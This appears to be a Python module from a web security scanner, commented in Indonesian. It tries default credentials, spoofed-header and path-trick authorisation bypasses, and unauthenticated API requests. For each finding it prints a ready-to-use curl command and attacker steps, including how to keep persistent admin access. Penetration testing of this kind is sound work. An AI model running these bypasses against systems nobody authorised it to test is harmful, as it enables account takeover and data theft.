"""Deep unauthenticated login/access bypass scanner.

Multi-vector approach — scanner ini mencoba SEMUA jalur masuk tanpa akun
dan hanya melaporkan finding bila benar-benar berhasil masuk (bukan
sekadar dapat response 200 kosong). Vektor yang diuji:

1. DEFAULT CREDENTIALS: admin/admin, root/root, dll pada form login yang
   ditemukan crawler + path admin umum.
2. AUTH HEADER BYPASS: X-Forwarded-For: 127.0.0.1, X-Original-URL, dll
   untuk path yang 401/403.
3. PATH TRICKS: /admin/..;/, /admin%20, //admin/, /admin/. untuk bypass
   reverse-proxy vs backend inconsistency.
4. API TOKEN BYPASS: akses endpoint API sensitif tanpa Authorization header.
5. SESSION FIXATION: cek apakah server menerima session ID yang kita
   tentukan sendiri (fixation risk).

Setiap vektor punya validasi multi-signal:
- Redirect ke halaman privileged
- Set-Cookie session baru
- Body memuat konten admin/dashboard
- Hilangnya halaman login di response
- JSON token di body

Output: confidence='confirmed' + detail langkah curl siap-pakai.
"""
from __future__ import annotations

import re
from urllib.parse import urljoin

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig
from cyberloka.recon.crawler import get_state

# ======================== CONSTANTS ========================

ADMIN_PATHS = [
    "/admin", "/admin/", "/administrator", "/dashboard",
    "/panel", "/manage", "/console", "/cpanel",
    "/wp-admin", "/wp-admin/", "/admin/dashboard",
    "/api/admin", "/api/admin/users", "/internal",
]

DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("admin", "123456"), ("root", "root"), ("root", "toor"),
    ("administrator", "administrator"), ("test", "test"),
    ("demo", "demo"), ("admin", "Admin@123"),
]

BYPASS_HEADERS_SETS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1", "X-Forwarded-For": "127.0.0.1"},
]

PATH_TRICKS = [
    "{path}/.", "{path}/..;/", "{path}%20", "{path}%09",
    "{path}%00", "//{path_no_slash}/", "{path}/./",
    "{path}..;/index", "{path}#",
]

# Signal login berhasil
SUCCESS_RE = re.compile(
    r"(welcome|dashboard|logout|sign.out|my.account|berhasil|"
    r"control.panel|admin.panel|selamat.datang)", re.I
)
FAIL_RE = re.compile(
    r"(invalid|wrong|incorrect|denied|unauthorized|forbidden|"
    r"salah|gagal|failed|tidak.sesuai)", re.I
)
TOKEN_RE = re.compile(
    r'"(access_token|token|jwt|session_id|sessionId)"\s*:\s*"[^"]{8,}"', re.I
)

MAX_ATTEMPTS = 5


# ======================== HELPERS ========================

def _is_login_success(resp, baseline_body: str = "") -> tuple[bool, str]:
    """Multi-signal validasi apakah login/akses berhasil.
    Returns (success: bool, signal_description: str).
    """
    if resp is None:
        return False, ""
    body = resp.text or ""
    signals = []

    # Signal 1: redirect ke halaman privileged
    if resp.status_code in (301, 302, 303, 307):
        loc = (resp.headers.get("Location") or "").lower()
        if any(p in loc for p in ("dashboard", "admin", "panel", "home", "profile")):
            signals.append(f"redirect ke {loc}")

    # Signal 2: session cookie baru
    cookies = [c.name for c in resp.cookies] if hasattr(resp, 'cookies') else []
    session_cookies = [c for c in cookies if any(
        k in c.lower() for k in ("session", "sess", "token", "auth", "login", "sid")
    )]
    if session_cookies:
        signals.append(f"session cookie: {session_cookies[0]}")

    # Signal 3: body berisi indikator sukses
    if resp.status_code == 200 and SUCCESS_RE.search(body):
        signals.append("body memuat indikator sukses (dashboard/welcome/logout)")

    # Signal 4: body TIDAK berisi indikator gagal
    if resp.status_code == 200 and not FAIL_RE.search(body):
        if len(body) > 500 and (not baseline_body or len(body) != len(baseline_body)):
            signals.append("body berbeda dari baseline + tidak ada pesan error")

    # Signal 5: JSON token
    if TOKEN_RE.search(body):
        signals.append("JSON token ditemukan di body")

    # Butuh minimal 1 strong signal atau 2 weak signals
    if len(signals) >= 2 or any("token" in s or "redirect" in s for s in signals):
        return True, "; ".join(signals)
    return False, ""


def _find_login_forms(config: ScanConfig) -> list[dict]:
    """Get login forms from crawler state."""
    state = get_state(config)
    if not state:
        return []
    forms = []
    for f in getattr(state, 'forms', []):
        inputs = f.get("inputs", [])
        has_password = any(i.get("type") == "password" for i in inputs)
        if has_password:
            forms.append(f)
    return forms


# ======================== VECTORS ========================

def _vector_default_creds(client: HttpClient, target: Target,
                          config: ScanConfig) -> list[Finding]:
    """Try default credentials on login forms."""
    findings = []
    forms = _find_login_forms(config)

    # Also try common admin login paths
    admin_login_paths = ["/login", "/admin/login", "/wp-login.php",
                         "/user/login", "/auth/login", "/signin"]
    for path in admin_login_paths:
        url = urljoin(target.base_url, path)
        r = client.get(url, allow_redirects=False)
        if r and r.status_code == 200:
            body = r.text or ""
            if re.search(r'<input[^>]+type=["\']password["\']', body, re.I):
                # Detect field names
                user_m = re.search(
                    r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\'](?:text|email)["\']',
                    body, re.I
                ) or re.search(
                    r'<input[^>]+type=["\'](?:text|email)["\'][^>]*name=["\']([^"\']+)["\']',
                    body, re.I
                )
                pass_m = re.search(
                    r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']password["\']',
                    body, re.I
                ) or re.search(
                    r'<input[^>]+type=["\']password["\'][^>]*name=["\']([^"\']+)["\']',
                    body, re.I
                )
                if user_m and pass_m:
                    user_field = user_m.group(1) or user_m.group(2)
                    pass_field = pass_m.group(1) or pass_m.group(2)
                    forms.append({
                        "action": path, "method": "post",
                        "inputs": [
                            {"name": user_field, "type": "text"},
                            {"name": pass_field, "type": "password"},
                        ]
                    })

    for form in forms[:3]:
        action = urljoin(target.base_url, form.get("action") or "")
        inputs = form.get("inputs", [])
        user_field = next((i["name"] for i in inputs
                          if i.get("type") in ("text", "email")), "username")
        pass_field = next((i["name"] for i in inputs
                          if i.get("type") == "password"), "password")

        # Get baseline (failed login response)
        baseline_data = {user_field: "cyblok_invalid_user_xyz", pass_field: "cyblok_invalid_pass"}
        baseline = client.post(action, data=baseline_data, allow_redirects=False)
        baseline_body = baseline.text if baseline else ""

        attempts = 0
        for username, password in DEFAULT_CREDS:
            if attempts >= MAX_ATTEMPTS:
                break
            attempts += 1

            client.session.cookies.clear()
            data = {user_field: username, pass_field: password}
            # Add hidden fields
            for inp in inputs:
                if inp.get("type") == "hidden" and inp.get("name"):
                    data.setdefault(inp["name"], inp.get("value") or "")

            resp = client.post(action, data=data, allow_redirects=False)
            success, signal = _is_login_success(resp, baseline_body)

            if success:
                curl_cmd = (
                    f"curl -i -X POST '{action}' \\\n"
                    f"  -d '{user_field}={username}&{pass_field}={password}'"
                )
                findings.append(Finding(
                    module="login_bypass_deep",
                    title=f"Login dengan default credentials: {username}/{password}",
                    severity=Severity.CRITICAL,
                    description=(
                        f"Form login di `{action}` menerima kredensial default "
                        f"`{username}/{password}`. Validasi multi-signal "
                        f"mengkonfirmasi akses berhasil: {signal}."
                    ),
                    target=action,
                    urls=[action],
                    evidence=(
                        f"POST {action}\n"
                        f"Data: {user_field}={username}&{pass_field}={password}\n"
                        f"Signal: {signal}\n"
                        f"Response: {resp.status_code if resp else 'N/A'}\n\n"
                        f"CURL SIAP PAKAI:\n{curl_cmd}"
                    ),
                    cwe="CWE-798",
                    confidence="confirmed",
                    remediation=(
                        "1. Ganti semua password default SEGERA.\n"
                        "2. Enforce password policy minimum (8 char, mixed case, digit).\n"
                        "3. Aktifkan account lockout setelah 5 percobaan gagal.\n"
                        "4. Aktifkan 2FA/MFA untuk akun admin.\n"
                        "5. Monitor login anomaly (IP baru, waktu tidak biasa)."
                    ),
                    references=[
                        "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password",
                    ],
                    exploitation_steps=[
                        f"Attacker temukan form login di {action}.",
                        f"Submit kredensial default `{username}/{password}`.",
                        f"Server respons dengan signal sukses: {signal}.",
                        "Attacker sekarang login sebagai admin — akses penuh ke panel.",
                        "Dari panel admin: kelola user, export data, upload file, ubah config.",
                    ],
                    validation_proof=[
                        f"Form login terdeteksi di {action} (field password ada)",
                        f"Submit {username}/{password} → multi-signal sukses: {signal}",
                        "Baseline (cred invalid) menghasilkan response berbeda",
                        f"Max {MAX_ATTEMPTS} percobaan per form (hindari lockout)",
                    ],
                    access_detail={
                        "tipe": "Account takeover (default credentials)",
                        "privilege": "admin",
                        "auth_pre": False,
                        "scope": ["read", "write", "delete"],
                        "data": "Seluruh data di panel admin — user management, "
                                "config, export, file upload.",
                        "lateral": "Dari admin panel sering bisa upload file → RCE, "
                                   "atau dapat DB credential di settings.",
                        "persistence": "Buat user admin baru, atau ubah password "
                                       "yang ada agar tetap punya akses.",
                    },
                ))
                return findings  # Satu login cukup

    return findings


def _vector_header_bypass(client: HttpClient, target: Target) -> list[Finding]:
    """Try header-based auth bypass on protected paths."""
    findings = []

    for path in ADMIN_PATHS:
        url = urljoin(target.base_url, path)
        baseline = client.get(url, allow_redirects=False)
        if baseline is None or baseline.status_code not in (401, 403):
            continue

        for headers in BYPASS_HEADERS_SETS:
            resp = client.get(url, headers=headers, allow_redirects=False)
            if resp is None:
                continue
            if resp.status_code < 400 and resp.status_code != baseline.status_code:
                body = resp.text or ""
                if len(body) > 200 and not FAIL_RE.search(body[:2000]):
                    header_str = " ".join(f"-H '{k}: {v}'" for k, v in headers.items())
                    curl_cmd = f"curl -i {header_str} '{url}'"
                    findings.append(Finding(
                        module="login_bypass_deep",
                        title=f"Auth bypass via header di {path}",
                        severity=Severity.CRITICAL,
                        description=(
                            f"Path `{path}` yang dilindungi (HTTP {baseline.status_code}) "
                            f"dapat diakses (HTTP {resp.status_code}) dengan header "
                            f"`{list(headers.keys())[0]}`. Reverse-proxy dan backend "
                            "punya authorisasi yang inkonsisten."
                        ),
                        target=url,
                        urls=[url],
                        evidence=(
                            f"Baseline: GET {url} → {baseline.status_code}\n"
                            f"Bypass: GET {url} + {headers} → {resp.status_code}\n"
                            f"Body length: {len(body)} (bukan halaman error)\n\n"
                            f"CURL SIAP PAKAI:\n{curl_cmd}"
                        ),
                        cwe="CWE-284",
                        confidence="confirmed",
                        remediation=(
                            "1. Jangan percaya header X-Forwarded-* / X-Original-URL "
                            "untuk keputusan otorisasi.\n"
                            "2. Pastikan auth dilakukan di BACKEND, bukan hanya di proxy.\n"
                            "3. Strip header X-Original-URL / X-Rewrite-URL di edge.\n"
                            "4. Normalize path SEBELUM auth check (decode, canonicalize)."
                        ),
                        references=[
                            "https://www.acunetix.com/vulnerabilities/web/x-original-url-header-bypass/",
                        ],
                        exploitation_steps=[
                            f"Attacker akses `{path}` → dapat HTTP {baseline.status_code} (blocked).",
                            f"Tambah header `{list(headers.keys())[0]}: {list(headers.values())[0]}`.",
                            f"Server respons HTTP {resp.status_code} — akses GRANTED.",
                            "Attacker sekarang lihat konten admin tanpa login.",
                            "Akses fungsi admin: kelola user, ubah config, lihat data sensitif.",
                        ],
                        validation_proof=[
                            f"Baseline GET {path} → {baseline.status_code} (protected)",
                            f"GET + header bypass → {resp.status_code} (access granted)",
                            f"Body ≠ error page (length {len(body)}, no fail keywords)",
                        ],
                        access_detail={
                            "tipe": "Authentication bypass (header trick)",
                            "privilege": "admin (tergantung path yang di-bypass)",
                            "auth_pre": False,
                            "scope": ["read", "write"],
                            "data": f"Konten di `{path}` — panel admin / data sensitif.",
                            "lateral": "Tidak langsung, tapi bisa membuka pintu untuk "
                                       "serangan lain (upload, config change).",
                            "persistence": "Tidak perlu — bypass bisa dilakukan kapan saja.",
                        },
                    ))
                    return findings

    return findings


def _vector_path_tricks(client: HttpClient, target: Target) -> list[Finding]:
    """Try path-based bypass for protected endpoints."""
    findings = []

    for path in ADMIN_PATHS[:6]:
        url = urljoin(target.base_url, path)
        baseline = client.get(url, allow_redirects=False)
        if baseline is None or baseline.status_code not in (401, 403):
            continue

        path_no_slash = path.lstrip("/")
        for trick_tpl in PATH_TRICKS:
            trick_path = trick_tpl.format(path=path, path_no_slash=path_no_slash)
            trick_url = urljoin(target.base_url, trick_path)
            resp = client.get(trick_url, allow_redirects=False)
            if resp is None:
                continue
            if resp.status_code < 400 and resp.status_code != baseline.status_code:
                body = resp.text or ""
                if len(body) > 200 and not FAIL_RE.search(body[:2000]):
                    curl_cmd = f"curl -i '{trick_url}'"
                    findings.append(Finding(
                        module="login_bypass_deep",
                        title=f"Path bypass: `{trick_path}` membuka akses admin",
                        severity=Severity.HIGH,
                        description=(
                            f"Path `{path}` (HTTP {baseline.status_code}) dapat "
                            f"diakses via trick `{trick_path}` (HTTP {resp.status_code}). "
                            "Path parser di reverse-proxy dan backend inkonsisten."
                        ),
                        target=trick_url,
                        urls=[url, trick_url],
                        evidence=(
                            f"Baseline: {path} → {baseline.status_code}\n"
                            f"Bypass: {trick_path} → {resp.status_code}\n\n"
                            f"CURL SIAP PAKAI:\n{curl_cmd}"
                        ),
                        cwe="CWE-284",
                        confidence="confirmed",
                        remediation=(
                            "Normalize URL path di edge (decode, strip dots, "
                            "canonicalize) SEBELUM auth decision."
                        ),
                        references=[
                            "https://github.com/iamj0ker/bypass-403",
                        ],
                        exploitation_steps=[
                            f"Attacker akses `{path}` → HTTP {baseline.status_code}.",
                            f"Coba path trick: `{trick_path}`.",
                            f"Server respons HTTP {resp.status_code} — bypass berhasil.",
                            "Akses konten admin / internal tanpa autentikasi.",
                        ],
                        validation_proof=[
                            f"Baseline: {path} → {baseline.status_code}",
                            f"Trick: {trick_path} → {resp.status_code}",
                            f"Body bukan error (length {len(body)}, no deny keywords)",
                        ],
                        access_detail={
                            "tipe": "Path traversal bypass",
                            "privilege": "tergantung path (sering admin)",
                            "auth_pre": False,
                            "scope": ["read"],
                            "data": f"Konten halaman `{path}`.",
                        },
                    ))
                    return findings

    return findings


def _vector_api_no_auth(client: HttpClient, target: Target) -> list[Finding]:
    """Try accessing API endpoints without Authorization header."""
    findings = []
    api_paths = [
        "/api/users", "/api/admin/users", "/api/v1/users",
        "/api/orders", "/api/config", "/api/settings",
        "/api/admin", "/api/internal", "/graphql",
    ]

    for path in api_paths:
        url = urljoin(target.base_url, path)
        resp = client.get(url, allow_redirects=False)
        if resp is None or resp.status_code != 200:
            continue
        body = resp.text or ""
        # Validasi: response harus berisi data JSON nyata (bukan error page)
        if not body.strip().startswith(("{", "[")):
            continue
        if len(body) < 50:
            continue
        # Skip kalau berisi error message
        if '"error"' in body.lower() or '"message":"unauthorized"' in body.lower():
            continue

        curl_cmd = f"curl -s '{url}' | jq ."
        findings.append(Finding(
            module="login_bypass_deep",
            title=f"API endpoint tanpa autentikasi: {path}",
            severity=Severity.HIGH,
            description=(
                f"Endpoint `{path}` mengembalikan data JSON tanpa memerlukan "
                "header Authorization. Siapa saja bisa membaca data ini."
            ),
            target=url,
            urls=[url],
            evidence=(
                f"GET {url} → 200\n"
                f"Content-Type: {resp.headers.get('Content-Type', 'N/A')}\n"
                f"Body (preview): {body[:200]}\n\n"
                f"CURL SIAP PAKAI:\n{curl_cmd}"
            ),
            cwe="CWE-306",
            confidence="confirmed",
            remediation=(
                "1. Wajibkan Authorization header (Bearer token / API key) "
                "untuk semua endpoint API sensitif.\n"
                "2. Implementasi RBAC — user hanya akses data miliknya.\n"
                "3. Audit semua route: pastikan middleware auth terpasang."
            ),
            references=[
                "https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/",
            ],
            exploitation_steps=[
                f"Attacker akses `{path}` tanpa header Authorization.",
                "Server respons HTTP 200 + JSON data.",
                "Data berisi informasi sensitif (users/orders/config).",
                "Attacker scrape seluruh endpoint → mass data extraction.",
            ],
            validation_proof=[
                f"GET {path} tanpa auth → 200 + JSON body",
                "Body dimulai {{ atau [ (valid JSON)",
                "Body bukan error message (length > 50, no 'unauthorized')",
            ],
            access_detail={
                "tipe": "Broken authentication (API)",
                "privilege": "anonymous",
                "auth_pre": False,
                "scope": ["read"],
                "data": f"Data dari endpoint `{path}` — "
                        "bisa users, orders, config, dll.",
                "lateral": "Enumerate semua endpoint API → mass data extraction.",
            },
        ))
        if len(findings) >= 2:
            break

    return findings


# ======================== MAIN ========================

def run(target: Target, config: ScanConfig) -> list[Finding]:
    """Run all login/access bypass vectors."""
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        # Vector 1: Default credentials
        findings.extend(_vector_default_creds(client, target, config))

        # Vector 2: Header bypass (skip if already found cred login)
        if not findings:
            findings.extend(_vector_header_bypass(client, target))

        # Vector 3: Path tricks
        if not findings:
            findings.extend(_vector_path_tricks(client, target))

        # Vector 4: API tanpa auth (always run — complementary)
        findings.extend(_vector_api_no_auth(client, target))
    finally:
        client.close()
    return findings
